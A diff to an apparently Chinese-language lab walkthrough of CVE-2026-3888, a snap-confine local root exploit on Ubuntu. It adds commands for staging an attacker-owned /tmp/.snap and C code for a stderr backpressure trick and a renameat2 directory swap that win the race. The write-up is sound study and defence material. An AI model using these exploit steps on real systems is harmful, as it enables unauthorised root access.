@@ -371,9 +371,265 @@ jonathan@snapped:~$ cat /usr/lib/tmpfiles.d/snapd.conf
 D! /tmp/snap-private-tmp 0700 root root -
 ```
 #### 这个内部的 /tmp 目录就是作为 snap 沙盒内的 /tmp 目录进行绑定挂载的。当您在 firefox snap 内运行并执行 ls /tmp 命令时，实际上查看的是主机上的 /tmp/snap-private-tmp/snap.firefox/tmp/ 目录。
+#### 需要理解的关键概念是模拟器。许多 snap 需要访问其基础 squashfs 映像中不存在的主机库。例如，firefox 需要 webkit2gtk-4.0，它位于：
+```
+jonathan@snapped:/$ ls -la /usr/lib/x86_64-linux-gnu/
+<SNIP>
+drwxr-xr-x  2 root root      4096 Mar 20 11:38 tracker-3.0
+drwxr-xr-x  4 root root      4096 Mar 20 11:38 tracker-miners-3.0
+drwxr-xr-x  3 root root      4096 Mar 20 11:38 webkit2gtk-4.1
+drwxr-xr-x  3 root root      4096 Mar 20 11:38 webkitgtk-6.0
+drwxr-xr-x  2 root root      4096 Mar 20 11:38 wireplumber-0.4
+drwxr-xr-x  3 root root      4096 Mar 20 11:38 X11
+drwxr-xr-x  2 root root      4096 Mar 20 11:38 xtables
+drwxr-xr-x  3 root root      4096 Mar 20 11:38 yelp
+jonathan@snapped:/$ ls -la /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0
+ls: cannot access '/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0': No such file or directory
+```
+#### /usr/lib/x86_64-linux-gnu is a read-only squashfs mount.
+#### 但在 Snap 的沙盒中，/usr/lib/x86_64-linux-gnu 是一个只读的 squashfs 挂载。您无法在只读文件系统中直接创建新目录。因此，snap-confine 通过执行以下操作来创建一个“模拟”——该目录的可写副本：
+```
+Step 1: mount --bind /usr/lib/x86_64-linux-gnu
+                  → /tmp/.snap/usr/lib/x86_64-linux-gnu
 
+Step 2: mount -t tmpfs tmpfs
+                  → /usr/lib/x86_64-linux-gnu
+        (now /usr/lib/x86_64-linux-gnu is a fresh, empty, writable tmpfs)
+
+Step 3: for each entry in /tmp/.snap/usr/lib/x86_64-linux-gnu:
+            mount --bind /tmp/.snap/usr/lib/x86_64-linux-gnu/<entry>
+                      → /usr/lib/x86_64-linux-gnu/<entry>
+        (repopulate the tmpfs with bind-mounts of everything from the original)
+
+Step 4: umount /tmp/.snap/usr/lib/x86_64-linux-gnu
+        (clean up the staging area)
+
+Step 5: mount--bind /snap/firefox/.../webkit2gtk-4.0
+                  -> /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0
+        (now the mountpoint exists and can be used)
+```
+#### 在此之后，在沙盒内部，/usr/lib/x86_64-linux-gnu 目录看起来完全正常——所有原始文件都通过绑定挂载方式存在，并且新的 webkit2gtk-4.0 目录已被添加进来。
+#### 问题所在之处
+```
+再看一下这个模拟序列。具体来说，看一下从步骤 1 到步骤 3 之间 /tmp/.snap 中的内容：
+- 在步骤 1 完成后：/tmp/.snap/usr/lib/x86_64-linux-gnu 目录中包含了所有实际库的绑定映射副本 - 步骤 3 从该目录读取内容，并以 root 身份将其中找到的所有内容进行绑定映射到 /usr/lib/x86_64-linux-gnu 目录下
+Qualys 提出的问题是：如果攻击者在步骤 1 和步骤 3 之间控制了 /tmp/.snap/usr/lib/x86_64-linux-gnu 的内容，那会怎样？
+然后，步骤 3 会将攻击者的文件以 root 身份进行绑定挂载到 /usr/lib/x86_64-linux-gnu 目录下。攻击者将能够控制该命名空间中的每一个共享库——包括动态链接器本身（ld-linux-x86-64.so.2）。
+
+"/tmp/.snap" 文件由根用户拥有权限……
+通常情况下，是这样的。"/tmp/.snap" 是由 "snap-confine" 工具以根用户身份（用户名：root，权限设置：0755）创建的。非特权用户无法修改其内容。
+然而，systemd-tmpfiles 会在一段时间内未对 /tmp/.snap 进行访问或修改的情况下将其删除。而 /tmp 自身是可被所有人读写的（权限设置为 1777）。因此，在删除之后，没有权限的攻击者可以重新创建 /tmp/.snap 并将其据为己有。
+这就是该漏洞的核心所在
+
+接下来：竞争条件
+该漏洞的性质已经明确，但要利用它则需要在模拟序列的步骤 1 和步骤 3 之间完成一场竞赛。
+请阅读 02 - “TOCTOU 竞争条件”以了解如何可靠地实现这一操作。
+```
+### 02-The TOCTOU Race Condition
+#### 根据 Qualys 公司于 2026 年 3 月 17 日发布的关于 CVE-2026-3888 的安全公告。
+```
+TOCTOU是什么？
+TOCTOU 代表Time-Of-Check to Time-Of-Use（检查时间到使用时间）。它描述了一类竞争条件，其中：
+
+程序会检查某些条件（例如“此目录是否包含安全文件？”）。
+检查和使用之间会经过一段时间。
+攻击者在该窗口期内修改了状态。
+该程序正在使用该资源，但该资源目前处于攻击者控制的状态。
+在 CVE-2026-3888 中，“检查”是步骤 1（snap-confine 将实际库读取到指定位置/tmp/.snap），“使用”是步骤 3（snap-confine 以 root 用户身份绑定挂载所有内容/tmp/.snap）。这两个步骤之间的时间窗口就是竞争条件。
+```
+#### 比赛安排 
+#### 第一阶段：进入沙盒,要拥有一个/tmp/.snap可供使用的目录，首先需要设置 snap 的沙箱：
+```
+jonathan@snapped:~$ systemd-run --user --scope --unit=snap.init$(date +%s) env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
+...<SNIP>...
+jonathan@snapped:/home/jonathan$ ls /tmp/.snap
+snap  usr
+jonathan@snapped:/home/jonathan$ ls -la /tmp
+total 12
+drwxrwxrwt  4 root root 4096 Apr 14 04:11 .
+drwxr-xr-x 21 root root  540 Apr 14 04:11 ..
+drwxrwxrwt  2 root root 4096 Apr 14 02:50 .X11-unix
+drwxr-xr-x  4 root root 4096 Apr 14 04:11 .snap
+```
+#### 在沙盒环境中，您位于 snap 包的/tmp目录中，该目录在主机上为：/tmp/snap-private-tmp/snap.firefox/tmp/ 
+#### 并且/tmp/.snap是由 snap-confine 创建的root:root 0755
+#### 第二阶段：等待 systemd-tmpfiles
+#### 策略是保持/tmp沙盒的活力（使其持续存在），同时让其/tmp/.snap逐渐老化：
+```
+jonathan@snapped:~$ systemd-run --user --scope --unit=snap.init$(date +%s) \
+  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
+  --base core22 snap.firefox.hook.configure /bin/bash
+Running as unit: snap.init1776156713.scope; invocation ID: 533040603f9444328c1b81bf9362a8fd
+bash: /home/jonathan/.bashrc: Permission denied
+jonathan@snapped:/home/jonathan$ cd /tmp
+jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done //现在要保持/tmp活跃，同时摒弃.snap陈旧观念
+jonathan@snapped:/tmp$ stat ./.snap
+stat: cannot statx './.snap': No such file or directory
+jonathan@snapped:/tmp$
+jonathan@snapped:/tmp$ echo $$
+9674
+
+//保持终端1运行，不要关闭它。
+//在默认的 Ubuntu 24.04 系统上，这需要 30 天时间。但是，可以通过修改脚本，在几分钟内模拟完成此过程。
+```
+#### 第三阶段：获取 /tmp/.snap 的所有权
+#### 一旦systemd-tmpfiles删除操作完成，攻击者即可通过以下方式从外部/tmp/.snap访问沙箱：/tmp,/proc/PID/cwd
+```
+cd /proc/<SANDBOX_PID>/cwd
+```
+#### /tmp现在我们通过挂载命名空间进入了沙箱内部。由于/tmp/.snap它已不存在，我们可以创建它
+```
+mkdir .snap                    # now attacker-owned
+mkdir -p .snap/usr/lib/x86_64-linux-gnu.exchange
+```
+#### 我们.exchange用真实库目录中的所有库的副本填充，再加上我们的恶意载荷。
+#### The Race Window 竞赛窗口
+```
+竞争窗口存在于设置snap-confine后发出的两条特定调试消息之间：SNAPD_DEBUG=1
+触发点（步骤 1 完成）：
+mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.snap/usr/lib/x86_64-linux-gnu"
+为时已晚（步骤 3 已完成）：
+unmount (none /tmp/.snap/usr/lib/x86_64-linux-gnu none x-snapd.detach 0 0)
+在两条消息之间，snap-confine步骤 3 中正在填充 tmpfs。如果我们能在触发之后、步骤 3 读取目录之前.snap/usr/lib/x86_64-linux-gnu将其与我们的.exchange目录交换，我们就成功了。
+
+原子交换通过以下方式完成renameat2(RENAME_EXCHANGE)：
+// Atomically swap two directories-no intermediate state
+syscall(SYS_renameat2,
+    AT_FDCWD, ".snap/usr/lib/x86_64-linux-gnu",   // current (real libs)
+    AT_FDCWD, ".snap/usr/lib/x86_64-linux-gnu.exchange",  // our payload
+    RENAME_EXCHANGE);
+RENAME_EXCHANGE这是一个 Linux 特有的标志，用于原子地交换两个文件系统条目。
+从内核的角度来看，交换是瞬间完成的，不会出现任何路径丢失的情况。
+
+问题：时机。
+试图检测触发条件然后执行交换这种简单粗暴的方法并不可靠：
+
+-snap-confine执行速度极快 - 步骤 1 和步骤 3 之间的时间窗口仅为微秒级 - 当用户空间检测到触发消息并做出反应时，步骤 3 已经完成
+
+这就是为什么大多数针对此类漏洞的简单竞态条件攻击都会失败的原因。解决方案——也是 Qualys 漏洞利用的关键创新点——在于完全避免竞态条件。而是：降低 snap-confine 的速度，使窗口足够长。
+
+Qualys 的解决方案很巧妙：与其尝试更快地做出反应，不如让 snap-confine 的速度变慢——具体来说，就是在需要的确切时刻无限期地暂停它。
+
+洞察：将 stderr 用作控制通道
+SNAPD_DEBUG=1启用此功能后，它会将执行的每个操作（包括每次挂载操作）的snap-confine详细调试输出写入指定位置。关键在于：stderr
+
+snap-confine同步写入这些调试信息
+如果目标缓冲区已满，write()则对文件描述符的系统调用会阻塞。
+如果我们能让 stderr 文件描述符在每次写入字节时都阻塞，snap-confine那么输出的每个字符都会暂停。
+这正是背压技术的原理--The backpressure technique。
+```
+### How Backpressure Works -- AF/UNXI背压技术
+```
+//步骤 1：创建缓冲区最小的套接字对
+int sv[2];
+socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
+
+// Set both send and receive buffers to 1 byte
+int bufsize = 1;
+setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
+setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
+setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+
+//socketpair()创建两个连接的套接字端点——类似于管道，但双向的。
+//关键在于SO_RCVBUF=1：SO_SNDBUF=1内核套接字缓冲区都被设置为 1 字节。
+//注意：内核可能会将这些值向上取整到最小值，但效果是一样的——缓冲区尽可能小。
+_______________________________________________________________
+//步骤 2：fork snap-confine 并重定向 stderr
+pid_t pid = fork();
+if (pid == 0) {
+    // Child: this will become snap-confine
+    close(sv[0]);              // close the read end
+    dup2(sv[1], STDERR_FILENO); // redirect stderr to the write end of the socket将标准错误输出重定向到套接字的写端。
+    close(sv[1]);
+
+    setenv("SNAPD_DEBUG", "1", 1);
+    setenv("SNAP_INSTANCE_NAME", "firefox", 1);
+
+    execl("/usr/lib/snapd/snap-confine", "snap-confine",
+          "--base", "core22",
+          "snap.firefox.hook.configure",
+          "/bin/sh", NULL);
+    _exit(1);
+}
+
+//现在snap-confine，`stderr` 连接到了我们套接字对的写入端。当 snap-confine 尝试写入调试输出时，它会将数据写入该套接字。
+_______________________________________________________________
+//步骤 3：逐字节读取 snap-confine 的输出
+// Parent: control loop
+close(sv[1]); // close write end
+
+char byte;
+while (read(sv[0], &byte, 1) > 0) {
+    // We read one byte-snap-confine can now write one more byte
+    // This creates the backpressure effect
+    
+    // Check accumulated output for trigger string
+    // ...
+}
+
+//结果：snap-confine 每次只能前进一个字节，并且只有在父进程显式读取字节时才会前进。父进程完全控制着 snap-confine 的执行速度。
+_______________________________________________________________
+//检测触发器Detecting the trigger
+//父进程逐字节读取输出，将其累积到环形缓冲区中，并扫描触发字符串：
+#define TRIGGER "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""
+
+char ringbuf[4096];
+int ringpos = 0;
+int tlen = strlen(TRIGGER);
+
+while (read(read_fd, &byte, 1) > 0) {
+    ringbuf[ringpos % sizeof(ringbuf)] = byte;
+    ringpos++;
+
+    if (ringpos >= tlen) {
+        // Check if the last tlen bytes match the trigger
+        char check[512];
+        for (int i = 0; i < tlen; i++)
+            check[i] = ringbuf[(ringpos-tlen + i) % sizeof(ringbuf)];
+        check[tlen] = '\0';
+
+        if (strstr(check, TRIGGER)) {
+            // TRIGGER DETECTED
+            // snap-confine is frozen right here, having just completed Step 1
+            // We have unlimited time to perform the swap
+            perform_swap();
+            break;
+        }
+    }
+}
+//检测到触发器后，snap-confine进程仍阻塞在尝试写入调试输出的下一个字节。父进程可以花费所需的时间执行目录交换——没有超时，也没有竞争条件。
+_______________________________________________________________
+//The Atomic Swap--原子交换
+//一旦检测到触发条件，父进程就会执行交换操作：
+#ifndef RENAME_EXCHANGE
+#define RENAME_EXCHANGE (1 << 1)
+#endif
+
+if (syscall(SYS_renameat2,
+        AT_FDCWD, ".snap/usr/lib/x86_64-linux-gnu",
+        AT_FDCWD, ".snap/usr/lib/x86_64-linux-gnu.exchange",
+        RENAME_EXCHANGE) == 0) {
+    // Success: the two directories have been atomically swapped
+    // .snap/usr/lib/x86_64-linux-gnu now contains our payload
+    // snap-confine will bind-mount our files as root in Step 3
+}
+//交换完成后，父进程会继续读取文件，从而解除 snap-confine 的阻塞，使其能够继续执行。
+//snap-confine 恢复运行，进入步骤 3，并以 root 权限挂载攻击者拥有的文件。
+```
+#### 为什么这种方法如此有效
+#### 反压技术将微秒级的比赛窗口转化为无限长的暂停。其主要特性如下：
+```
+财产							影响
+SO_SNDBUF=1在写入套接字上		写入每个字节后立即限制块大小
+SO_RCVBUF=1在读取套接字上		接收端也没有缓冲。
+父进程一次读取一个字节			父级控制 snap-confine 何时推进
+累积输出触发检测				父级确切地知道 snap-confine 在执行过程中的位置
+renameat2(RENAME_EXCHANGE)	原子交换，无中间不一致状态
+```
+#### 结果就是，一旦前提条件满足，就会出现100%获胜的竞争条件，因为根本不存在竞争——攻击者将执行过程串行化。
 -----------------------------------------------------------------------------------------
-### 官方的方式行不通 firefox.c的代码不对劲
+### 官方的方式行不通 firefox.c的代码不对劲,而且超级看不懂官方的人话
 #### 对于 /usr/lib/x86_64-linux-gnu 目录的模拟序列是：
 ```
 1. mount --bind /usr/lib/x86_64-linux-gnu → /tmp/.snap/usr/lib/x86_64-linux-gnu
@@ -958,10 +1214,3 @@ jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confin
 /usr/lib/snapd/snap-confine: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found (required by /usr/lib/snapd/snap-confine)
 ``` 
 ----------------------------------------------------------------------
-Busybox shell
-----------------------------------------------------------------------
-#### Step 8 — Escape sandbox
-----------------------------------------------------------------------
-Terminal 3
-----------------------------------------------------------------------
-#### Step 9 — Full root
